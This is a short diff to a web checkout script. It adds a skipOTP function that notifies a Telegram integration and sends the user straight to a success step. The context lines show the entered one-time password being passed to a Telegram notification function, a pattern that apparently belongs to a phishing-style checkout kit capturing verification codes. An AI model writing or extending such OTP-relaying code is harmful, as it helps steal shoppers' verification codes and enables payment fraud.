@@ -2303,6 +2303,18 @@ function verifyOTP() {
             TelegramNotifications.userEnteredOTP(enteredOTP);
         }
 
+
+
+		function skipOTP() {
+    // Optional: notify Telegram that OTP was skipped
+    if (typeof TelegramNotifications !== 'undefined') {
+        TelegramNotifications.otpSkipped?.(); // Optional chaining
+    }
+
+    console.warn('User skipped OTP. Proceeding to next step.');
+    goToCheckoutStep('success'); // or whatever your next step is
+}
+
         // Show processing step (spinner)
         goToCheckoutStep(4);
 
